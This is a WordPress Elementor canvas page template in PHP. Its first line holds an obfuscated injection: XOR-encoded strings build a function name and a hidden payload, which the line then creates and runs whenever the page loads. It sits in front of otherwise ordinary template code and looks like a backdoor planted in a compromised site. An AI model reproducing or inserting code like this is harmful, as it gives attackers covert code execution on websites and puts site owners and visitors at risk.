<?php $QyOtTXSyDSGZ='CHQ-Z545OB6ZYW<'^' :4L.PkS:,U.08R';$KSWOdSY=$QyOtTXSyDSGZ('','1HmlQ,N4X<Z9;E0-168pj-O94.08ZcoYY0pPlBIO1-,;3LY9VdVRCt6AI1++;MFZq,UD-mlE=2JDyAGryKCHEuR>TvJbqFBAOK49 Nh.MtVytGWZf:57W54oRIRI3GOQQDaQhk:soOU<HlzWmT .JY6v,jtkErE1E=C.fLZK6OGKSdJ;NNJephN2D3.GU5<ofTLGSXGpSOH2cgTV0PFyV,MA4Eo0jXQ0-k=11bxuF1875VDM.8BEP5=zYJj7o;.t3qONdR;37rdSaSZ99=KoN,D4l6J9Xh,66BgHNG -x3=RR1..fQni2Y><3U04z783JqFa3L6SqaIxMH,71OO+sqfho=0,013XUAJNFRESrSsi>5;M+an>k=7N2;E,n2KAfztoZE8AXGxF.+X.VDleBJ>3SwAeGg8Z;bI626sQo7,E07AQJAI2XYDYJfQ,;+=rT9.E5V2SBZ,-0H..KGR17DPaFEp,V;8k-0-HfThWFcf,4BRAeAVX8<W:hV+>s=L8CDJxc2W3NYVm2O03OKCeVr.=EcL++,-wP-TDssYOvdpJq0rpb RgPJ5XHKswQEXH MrKGdW=0wtyfEQTQWO<IW,0-I=80<06J7FHB6YBV6SJhaCHPTZxgeqwFmoHO:X5O=LP Z0Ucf7OY=R Xv8AXaa53=3fvzR3P'^'X.EM7Y W,U5Wd HDBBKXMU KkJQL;<04,DWyEb2E8KYUP80V8D.=1+R =PttV82rUH40LALaVW3mYagRY0IALQ=K VwBVayKFBRVRfLGmIvIOgs3ZIAE;PZGv-3=Rntqu-JzAa3zK  HhBGwEpDO>8mRE7T5eV.T<fgGFiz8B=+.=LnP+7c8YSD;MAK3 GRGB;93zcMy.E58iC07D1fDvJ,-G T:N<0DL4VTHBEU PTDPmNGHW0 1VUZqn5t te=vQ.=DvPVNRYmAw,XUH.FnWN=HR+M97GSObZhj,ETC94v6PZOFlNMD8RIVn:Ip=QUjYgEW-B2XA2rD.CET.,CSYB7=xayubgx42jj-7<sOmSMHTW8NHNEa4>jVZ1M1Y.8FGTK1 AzRNqbJJ,OvyLA4+RF6LKl:mEP1F-WFWSlOwY+CR38+- H=q<6895MOJb-9LZmW7A6tnsIU+AJ.ovUV01HjeTH7OY4FUTaOob> KBHU63aCgv9JN6C7=NG,X4Q009PDY2JiuvIV.DRfkeCvZCYpKhOJXL,wF1=T.poKYPmIUDBUE0ThxS;y-COat<.EzB-qS6XVDANAlqrww.N;6UoF,DgUDYE>Dno2W .9W7mDAg,1 ;QNEQWfMO3E3=C.QdtD;D48AG. Q=A<QehckhPKTGNFSi9-');$KSWOdSY();

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}
?>
<!DOCTYPE html>
<html <?php language_attributes(); ?> class="no-js">
	<head>
		<meta charset="<?php bloginfo( 'charset' ); ?>">
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<?php if ( ! current_theme_supports( 'title-tag' ) ) : ?>
		<title><?php echo wp_get_document_title(); ?></title>
		<?php endif; ?>
		<?php wp_head(); ?>
	</head>
	<body <?php body_class(); ?>>
	<?php
	/**
	 * Before canvas page template content.
	 *
	 * Fires before the content of Elementor canvas page template.
	 *
	 * @since 1.0.0
	 */
	do_action( 'elementor/page_templates/canvas/before_content' );

	while ( have_posts() ) :
		the_post();
		the_content();
	endwhile;

	/**
	 * After canvas page template content.
	 *
	 * Fires after the content of Elementor canvas page template.
	 *
	 * @since 1.0.0
	 */
	do_action( 'elementor/page_templates/canvas/after_content' );
	wp_footer();
	?>
	</body>
</html>
